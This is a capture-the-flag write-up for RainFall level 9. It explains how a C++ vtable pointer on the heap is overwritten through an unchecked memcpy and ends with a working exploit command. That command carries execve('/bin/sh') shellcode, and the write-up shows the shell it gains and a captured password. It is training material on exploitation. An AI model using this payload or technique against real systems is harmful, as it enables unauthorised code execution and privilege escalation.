# Level 9

This time, we got blessed by C++ code!

The executable allocates the space for two new objects of the class `N` with `new`.

When we take a look at the decompiled version of the constructor on Ghidra,
there is some weird assignation going on:

```c++
void __thiscall N::N(N *this,int param_1)

{
  *(undefined ***)this = &PTR_operator+_08048848;
  *(int *)(this + 0x68) = param_1;
  return;
}
```

So `*this` is assigned to a function pointer??? WTF?!?
This happens because the pointer is poiting to the `operator+(&N)` function and it happens to be a `volatile` function.
This is code written by the compiler, not the user.

Classes with volatile functions in C++ have a `vtable` where the pointer to `volatile` functions are stored for runtime resolving.
This `vtable` is starting at the address of the object. Lets say that we allocated our object on the address `0x100`:

```
+---------------+---------------+---------------+
| 0x100         | vtable        | operator+(&N) |
+---------------+---------------+---------------+
| 0x104         | parameters    | N::char       |
|               |               |     s[0x64]   |
|               |               |               |
|               |               |               |
|               |               |               |
|               |               |               |
+---------------+               +---------------+
| 0x168         |               | N::int param  |
+---------------+---------------+---------------+
```

We saw that we are allocating two object on the heap.
So, assuming the heap starts at `0x804a000`, our heap memory will look like this:

```
+---------------+---------------+---------------+
| 0x804a000     | malloc metadata               |
+---------------+---------------+---------------+
| 0x804a008     | vtable        | operator+(&N) |
+---------------+---------------+---------------+
| 0x804a00c     | parameters    | N::char       |
|               |               |     s[0x64]   |
|               |               |               |
|               |               |               |
|               |               |               |
|               |               |               |
+---------------+               +---------------+
| 0x804a070     |               | N::int param  |
+---------------+---------------+---------------+
| 0x804a074     | malloc metadata               |
+---------------+---------------+---------------+
| 0x804a078     | vtable        | operator+(&N) |
+---------------+---------------+---------------+
| 0x804a07c     | parameters    | N::char       |
|               |               |     s[0x64]   |
|               |               |               |
|               |               |               |
|               |               |               |
|               |               |               |
+---------------+               +---------------+
| 0x804a0e0     |               | N::int param  |
+---------------+---------------+---------------+
| 0x804a0e4     | malloc metadata               |
+---------------+---------------+---------------+
```

Lets look back to the source code, what happens after the constructors:

```c++
void main(int argc,char **argv)
{
	N *base;
	N *other;

	if (argc < 2) {
		exit(1);
	}
	
	base = new N(5);

	other = new N(6);

	base.setAnnotation(argv[1]);

	other + base;
	return;
}
```

```c++
void	N::setAnnotation(char *str) {
	size_t	n;

	n = strlen(str);
	memcpy(this.s, str, n);
}
```

We can see that `base` is calling `setAnnotation` then `other` is calling its `operator+ (&N)`.
By looking at the disassembly we can see that the last function call, the one for the `operator+ (&N)`,
is set up dynamically (`0x08048693 <+159>`):

```gdb
(gdb) disas main
Dump of assembler code for function main:
[...]
   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
   0x08048693 <+159>:   call   edx
   0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:   leave  
   0x08048699 <+165>:   ret
```

So this confirms that the `operator+ (&N)` is set at runtime.
We also see in the source code that `setAnnotation` can easely overflow because there is no size check of the argument.
So in theory we could overwrite to the point of writing another function address at the address of `operator+ (&N)` of the `other` object.

```
XXXX means garbage data
.... means other data

                                                     Data
+---------------+---------------+---------------+------------+
| 0x804a000     | malloc metadata               |  ........  |
+---------------+---------------+---------------+------------+
| 0x804a008     | vtable        | operator+(&N) | 0x08048848 | <- Address of the real operator
+---------------+---------------+---------------+------------+
| 0x804a00c     | parameters    | N::char       |  XXXXXXXX  |
|               |               |     s[0x64]   |  XXXXXXXX  |
|               |               |               |  XXXXXXXX  |
|               |               |               |  XXXXXXXX  |
|               |               |               |  XXXXXXXX  |
|               |               |               |  XXXXXXXX  |
+---------------+               +---------------+------------+
| 0x804a070     |               | N::int param  |  XXXXXXXX  |
+---------------+---------------+---------------+------------+
| 0x804a074     | malloc metadata               |  XXXXXXXX  |
+---------------+---------------+---------------+------------+
| 0x804a078     | vtable        | operator+(&N) | 0xbad_addr | <- We overwrite the address
+---------------+---------------+---------------+------------+
| 0x804a07c     | parameters    | N::char       |  ........  |
|               |               |     s[0x64]   |  ........  |
|               |               |               |  ........  |
|               |               |               |  ........  |
|               |               |               |  ........  |
|               |               |               |  ........  |
+---------------+               +---------------+------------+
| 0x804a0e0     |               | N::int param  |  ........  |
+---------------+---------------+---------------+------------+
| 0x804a0e4     | malloc metadata               |  ........  |
+---------------+---------------+---------------+------------+
```

Now taht we understand this, lets have a quick look at `0x08048848`,
the address of the `operator+(&N)`:

```gdb
(gdb) x/wx 0x08048848
0x8048848 <vtable for N+8>:   0x0804873a
(gdb) x/9i 0x0804873a
   0x804873a <N::operator+(N&)>:     push   ebp
   0x804873b <N::operator+(N&)+1>:   mov    ebp,esp
   0x804873d <N::operator+(N&)+3>:   mov    eax,DWORD PTR [ebp+0x8]
   0x8048740 <N::operator+(N&)+6>:   mov    edx,DWORD PTR [eax+0x68]
   0x8048743 <N::operator+(N&)+9>:   mov    eax,DWORD PTR [ebp+0xc]
   0x8048746 <N::operator+(N&)+12>:  mov    eax,DWORD PTR [eax+0x68]
   0x8048749 <N::operator+(N&)+15>:  add    eax,edx
   0x804874b <N::operator+(N&)+17>:  pop    ebp
   0x804874c <N::operator+(N&)+18>:  ret
```

Basically, whats stored at `0x08048848` is the address of the function itself,
not directly the code. Now that we know that, we will too need two addresses.

```
XXXX means garbage data
.... means other data
**** means padding
---- means nopslide
ADDR means address
oooo means shellcode
                                                     Data
+---------------+---------------+---------------+------------+
| 0x804a000     | malloc metadata               |  ........  |
+---------------+---------------+---------------+------------+
| 0x804a008     | vtable        | operator+(&N) | 0x08048848 |
+---------------+---------------+---------------+------------+
| 0x804a00c     | parameters    | N::char       |  XXXXXXXX  |
|               |               |     s[0x64]   |  XXXXXXXX  |
|               |               |               |  XXXXXXXX  |
|               |               |               |  XXXXXXXX  |
|               |               |               |  XXXXXXXX  |
|               |               |               |  XXXXXXXX  |
+---------------+               +---------------+------------+
| 0x804a070     |               | N::int param  |  XXXXXXXX  |
+---------------+---------------+---------------+------------+
| 0x804a074     | malloc metadata               |  XXXXXXXX  |
+---------------+---------------+---------------+------------+
| 0x804a078     | vtable        | operator+(&N) | 0x0804a080 | <- Address number 1
+---------------+---------------+---------------+------------+
| 0x804a07c     | parameters    | N::char       |  ****ADDR  | <- Address number 2, poiting 4 bytes after
|               |               |     s[0x64]   |  ****----  | <- nopslide
|               |               |               |  --------  |
|               |               |               |  oooooooo  | <- /bin/sh shellcode
|               |               |               |  oooooooo  |
|               |               |               |  oooooooo  |
+---------------+               +---------------+------------+
| 0x804a0e0     |               | N::int param  |  ........  |
+---------------+---------------+---------------+------------+
| 0x804a0e4     | malloc metadata               |  ........  |
+---------------+---------------+---------------+------------+
```

This is the data we need:
- 108 Bytes of garbage data
- Address number one is written at `0x804a078` and is `0x0804a080`, pointing 4 bytes after.
- 4 bytes of padding, this serves no purpose other than debugging.
- Address number two, written at `0x0804a080` and is `0x0804a088`, poiting 4 bytes after.
- 4 bytes of padding.
- A nopslide (multiple `nop` instructions)
- Our `execve("/bin/sh")` shellcode

```bash
level9@RainFall:~$ ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaabbbbccccddddeeeeffff`echo -ne "\x80\xa0\x04\x08****\x88\xa0\x04\x08****\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"`
$ whoami
bonus0
$ cd ../bonus0
$ cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## .pass: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728